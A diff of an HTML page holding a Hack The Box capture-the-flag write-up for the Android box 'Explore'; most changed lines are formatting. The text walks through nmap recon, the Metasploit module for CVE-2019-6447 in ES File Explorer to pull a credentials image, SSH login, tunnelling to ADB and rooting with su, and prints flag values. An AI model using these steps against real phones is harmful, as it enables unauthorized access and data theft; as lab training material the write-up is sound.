@@ -1,15 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-03-28 Mon 13:31 -->
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- 2022-04-15 Fri 15:51 -->
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>HTB | Explore</title>
-<meta name="generator" content="Org mode">
+<meta name="generator" content="Org Mode" />
 <link rel="stylesheet" type="text/css" href="static/style.css" />
-<script type="text/javascript">
-// @license magnet:?xt=urn:btih:e95b018ef3580986a04669f1b5879592219e2a7a&dn=public-domain.txt Public Domain
-<!--/*--><![CDATA[/*><!--*/
+<script>
+// @license magnet:?xt=urn:btih:1f739d935676111cfff4b4693e3816e664797050&amp;dn=gpl-3.0.txt GPL-v3-or-Later
      function CodeHighlightOn(elem, id)
      {
        var target = document.getElementById(id);
@@ -26,7 +25,6 @@
          target.classList.remove("code-highlighted");
        }
      }
-    /*]]>*///-->
 // @license-end
 </script>
 </head>
@@ -37,12 +35,12 @@
     <a href="https://github.com/c3lphie">Github</a>
 </div>
 </div>
-<div id="content">
+<div id="content" class="content">
 <header>
 <h1 class="title">HTB | Explore</h1>
-</header><nav id="table-of-contents">
+</header><nav id="table-of-contents" role="doc-toc">
 <h2>Table of Contents</h2>
-<div id="text-table-of-contents">
+<div id="text-table-of-contents" role="doc-toc">
 <ul>
 <li><a href="#org0738360">1. Introduction</a></li>
 <li><a href="#org50cc6f7">2. Recon</a>
@@ -60,7 +58,7 @@
 </div>
 </nav>
 <div id="outline-container-org0738360" class="outline-2">
-<h2 id="org0738360"><span class="section-number-2">1</span> Introduction</h2>
+<h2 id="org0738360"><span class="section-number-2">1.</span> Introduction</h2>
 <div class="outline-text-2" id="text-1">
 <p>
 Welcome to this write-up for the easy box named Explore.<br>
@@ -69,7 +67,7 @@ In this write-up we'll attack an android device, showing just how important it i
 </div>
 </div>
 <div id="outline-container-org50cc6f7" class="outline-2">
-<h2 id="org50cc6f7"><span class="section-number-2">2</span> Recon</h2>
+<h2 id="org50cc6f7"><span class="section-number-2">2.</span> Recon</h2>
 <div class="outline-text-2" id="text-2">
 <p>
 As always we start doing some recon on the box.<br>
@@ -77,12 +75,12 @@ And we'll quickly find that this isn't a normal box, this is an android phone!<b
 </p>
 </div>
 <div id="outline-container-orga6a3a72" class="outline-3">
-<h3 id="orga6a3a72"><span class="section-number-3">2.1</span> Nmap</h3>
+<h3 id="orga6a3a72"><span class="section-number-3">2.1.</span> Nmap</h3>
 <div class="outline-text-3" id="text-2-1">
 <p>
 The result from <code>nmap</code> isn't really that useful as it is filled with a lot of noise.<br>
 </p>
-<pre class="example" id="org7f4074e">
+<pre class="example" id="orgc90acdc">
 # Nmap 7.91 scan initiated Mon Jul 26 23:11:21 2021 as: nmap -sC -sV -p- -oA nmap/all_ports -v 10.129.161.205
 Nmap scan report for 10.129.161.205
 Host is up (0.032s latency).
@@ -262,26 +260,26 @@ Now it would make no sense for a smartphone to be running a minecraft bukkit ser
 </p>
 
 <p>
-<b>Spoiler ALERT</b> it doesn't&#x2026; But google quickly tells us about <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6447">CVE-2019-6447</a>, which basically a backdoor in a File manager (ES File Explorer) for android.<br>
+<b>Spoiler ALERT</b> it doesn't&#x2026; But googling the port number quickly tells us about <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6447">CVE-2019-6447</a>, which basically a backdoor in a File manager (ES File Explorer) for android.<br>
 </p>
 </div>
 </div>
 </div>
 <div id="outline-container-org29bd662" class="outline-2">
-<h2 id="org29bd662"><span class="section-number-2">3</span> Exploitation</h2>
+<h2 id="org29bd662"><span class="section-number-2">3.</span> Exploitation</h2>
 <div class="outline-text-2" id="text-3">
 <p>
 We can use the vulnerability to read files on the machine, and hopefully find some juicy info.<br>
 </p>
 </div>
 <div id="outline-container-orgcb451d3" class="outline-3">
-<h3 id="orgcb451d3"><span class="section-number-3">3.1</span> ES File explorer</h3>
+<h3 id="orgcb451d3"><span class="section-number-3">3.1.</span> ES File explorer</h3>
 <div class="outline-text-3" id="text-3-1">
 <p>
 Metasploit has a handy module for exploiting CVE-2019-6447, that we can use for enumerating all kinds of things on the machine.<br>
 We can start by looking at installed apps:<br>
 </p>
-<pre class="example" id="org3f27048">
+<pre class="example" id="orgea584b5">
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTION LISTAPPS
 ACTION =&gt; LISTAPPS
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; run
@@ -304,7 +302,7 @@ This more or less just confirmed the findings from the <code>nmap</code> scan.<b
 <p>
 We can also look at pictures on the phone:<br>
 </p>
-<pre class="example" id="orga605785">
+<pre class="example" id="org0d1f318">
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTION LISTPICS
 ACTION =&gt; LISTPICS
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; run
@@ -326,7 +324,7 @@ Which proved quite promising with the <code>creds.jpg</code> pricture!<br>
 <p>
 So let's download <code>creds.jpg</code> and get those juicy secrets<br>
 </p>
-<pre class="example" id="org73e29c1">
+<pre class="example" id="org0558908">
 msf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTION GETFILE
 ACTION =&gt; GETFILE
 sf6 auxiliary(scanner/http/es_file_explorer_open_port) &gt; set ACTIONITEM /storage/emulated/0/DCIM/creds.jpg
@@ -352,12 +350,12 @@ We can now login with using ssh and get a shell!<br>
 </div>
 </div>
 <div id="outline-container-orgb38981e" class="outline-3">
-<h3 id="orgb38981e"><span class="section-number-3">3.2</span> Getting access</h3>
+<h3 id="orgb38981e"><span class="section-number-3">3.2.</span> Getting access</h3>
 <div class="outline-text-3" id="text-3-2">
 <p>
 Now that we have credentials, we can just connect through ssh and get user flag!<br>
 </p>
-<pre class="example" id="org33607ae">
+<pre class="example" id="orgc0e8f59">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/explore ]
 └─&gt; $ ssh explore.htb                                               
 Password authentication
@@ -393,7 +391,7 @@ f32017174c7c7e8f50c6da52891ae250
 <p>
 Next thing we can do tunnel the port to get a connection to the <code>freeciv</code> port which is meant for Android Debugging Bridge.<br>
 </p>
-<pre class="example" id="org960d353">
+<pre class="example" id="org9d20582">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/explore ]
 └─&gt; $ ssh explore.htb -L 5555:127.0.0.1:5555 
 Password authentication
@@ -412,7 +410,7 @@ $ adb connect 127.0.0.1:5555
 <p>
 And the use <code>adb shell</code> to get a basic shell, that we can upgrade to root using <code>su</code><br>
 </p>
-<pre class="example" id="org8e0da2d">
+<pre class="example" id="org29d0cb6">
 
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/explore ]
 └─&gt; $ adb shell                                                     1:12
@@ -423,7 +421,7 @@ x86_64:/ $ su
 <p>
 And then finally get the root flag<br>
 </p>
-<pre class="example" id="orgeac155a">
+<pre class="example" id="org54801c6">
 1|:/ # ls data
 adb           bootchart     media       property       tombstones
 anr           cache         mediadrm    resource-cache user
